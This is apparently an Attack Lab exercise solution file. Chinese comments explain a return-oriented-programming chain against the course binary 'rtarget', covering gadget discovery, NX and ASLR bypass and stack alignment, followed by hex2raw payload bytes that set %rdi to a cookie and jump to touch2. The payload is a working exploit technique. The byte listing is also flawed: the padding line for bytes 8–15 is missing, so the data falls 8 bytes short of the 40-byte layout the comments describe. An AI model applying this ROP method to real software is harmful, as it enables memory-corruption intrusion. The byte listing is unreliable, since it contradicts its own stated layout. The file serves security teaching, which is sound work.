/* ===========================================================================
 * Phase 4: ROP 攻击 — 用 gadget 链调用 touch2(cookie)
 * 目标程序: rtarget (栈不可执行 NX, 栈地址随机化 ASLR)
 *
 * 攻击原理:
 *   rtarget 的栈不可执行，不能像 Phase 2 那样注入机器码。
 *   改用 ROP (Return-Oriented Programming)：找程序代码段里已有的
 *   指令片段（gadget），用 ret 把它们串起来。
 *
 *   Phase 4 目标 = Phase 2 的目标：%rdi = cookie, 跳到 touch2。
 *   用 gadget "pop %rdi; ret" 从栈上弹出 cookie 值到 %rdi。
 *
 * Q: gadget 是什么？怎么找到的？
 * A: gadget 是以 ret (c3) 结尾的指令序列。它们不一定是一条完整指令——
 *    常常藏在其他指令的字节中间。例如 0x401419 处的指令是
 *    "imul $0xc35f,%eax,%eax"，字节为 69 c0 5f c3 00 00。
 *    从 0x40141b 开始解读（跳过前 2 字节）：
 *      5f = pop %rdi
 *      c3 = ret
 *    这就是我们要的 gadget，地址是 0x40141b。
 *
 * Q: 栈不可执行怎么验证的？为什么 getbuf 还能执行？
 * A: ① 把 Phase 2 的注入代码直接喂给 rtarget → 立即段错误（实测验证）
 *    ② getbuf/touch2/gadget 都在代码段 (.text)，不在栈上。
 *       代码段始终可执行，NX 只禁止栈上的执行。
 *       ROP 的 %rip 始终在代码段内跳转，从不指向栈。
 *
 * Q: ASLR 为什么对 ROP 无效？
 * A: ASLR 只随机化栈和堆的基地址。代码段地址是固定的（rtarget 非 PIE）。
 *    0x40141b 永远在 0x40141b，不管栈地址怎么变。
 *    ROP 链只包含代码段地址和数值，不依赖任何栈地址。
 *
 * Q: 为什么要多一个 ret（0x401999）？
 * A: x86-64 ABI 要求函数入口时 rsp % 16 == 8（16 字节对齐）。
 *    不加额外 ret 时 touch2 入口 rsp % 16 == 0，内部调 printf/validate
 *    时某些 SSE 指令（movaps）要求 16 字节对齐的栈，不对齐就段错误。
 *    多一个 ret 多吃 8 字节栈 → rsp 多走 8 → rsp%16 从 0 变 8 → 对齐。
 *
 * Q: 栈上写的是地址 0x40141b，不是指令。CPU 怎么执行的？
 * A: getbuf 的 ret 从栈上弹出 0x40141b → 写进 %rip → CPU 跳到代码段的
 *    0x40141b → 执行那里的字节 5f c3 (= pop %rdi; ret)。
 *    栈上只存"去哪"的门牌号，真正的指令在代码段。
 *
 * 栈布局 (Gets 写完之后):
 *   BUF+0x00 ┌── 40B 0x00 ────┐  填充
 *   BUF+0x28 ├── 0x40141b ────┤  gadget1: pop %rdi; ret
 *   BUF+0x30 ├── cookie值 ────┤  0x59b997fa (被 pop 进 %rdi)
 *   BUF+0x38 ├── 0x401999 ────┤  gadget2: ret (纯对齐，只弹一次栈)
 *   BUF+0x40 └── 0x4017ec ────┘  touch2 地址
 *
 * 执行流 (每个 ret 弹下一个地址):
 *   getbuf ret → pop_rdi (0x40141b) → pop cookie→%rdi → ret
 *   → 对齐ret (0x401999) → ret → touch2
 *   touch2: cmp cookie, %edi → 匹配 → PASS
 *
 * 测试: cat phase4.txt | ./target1/hex2raw | ./target1/rtarget -q
 * =========================================================================== */

00 00 00 00 00 00 00 00  /* 填充 0~7   */

00 00 00 00 00 00 00 00  /* 填充 16~23 */
00 00 00 00 00 00 00 00  /* 填充 24~31 */
00 00 00 00 00 00 00 00  /* 填充 32~39 */
1b 14 40 00 00 00 00 00  /* [G1] pop %rdi; ret @ 0x40141b         */
fa 97 b9 59 00 00 00 00  /* cookie 值 0x59b997fa (被 pop 进 %rdi)  */
99 19 40 00 00 00 00 00  /* [G2] ret @ 0x401999 (对齐用，无副作用)  */
ec 17 40 00 00 00 00 00  /* touch2 @ 0x4017ec                     */
